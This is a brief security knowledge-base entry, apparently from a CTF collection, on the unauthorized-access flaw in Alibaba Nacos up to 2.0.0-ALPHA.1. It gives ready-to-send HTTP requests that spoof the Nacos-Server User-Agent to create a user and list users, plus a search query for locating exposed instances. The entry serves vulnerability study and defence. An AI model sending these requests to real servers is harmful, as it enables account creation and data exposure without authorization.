---
title: Nacos 未授权访问漏洞
category: cloud-security
tags: [nacos, unauthorized-access, registry, config-center, alibaba]
triggers: [nacos, 8848, Nacos-Server, /v1/auth/users, 配置中心, 注册中心, alibaba]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/cloud-security/Nacos 未授权访问漏洞.md]
---

## Summary

Alibaba Nacos ≤ 2.0.0-ALPHA.1 存在未授权访问漏洞，攻击者可创建新用户、查看配置、修改数据。

## Details

### 利用

```http
# 创建用户
POST /nacos/v1/auth/users HTTP/1.1
Host: target
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username=evil&password=evil

# 查看用户列表
GET /nacos/v1/auth/users?pageNo=1&pageSize=100 HTTP/1.1
Host: target
User-Agent: Nacos-Server
```

### 网络测绘

```
title="Nacos"
```

## Connections

- GHSA: [[code-audit/ghsa-cloud-security]]
- Related: [[ops-console-attack-surface]]
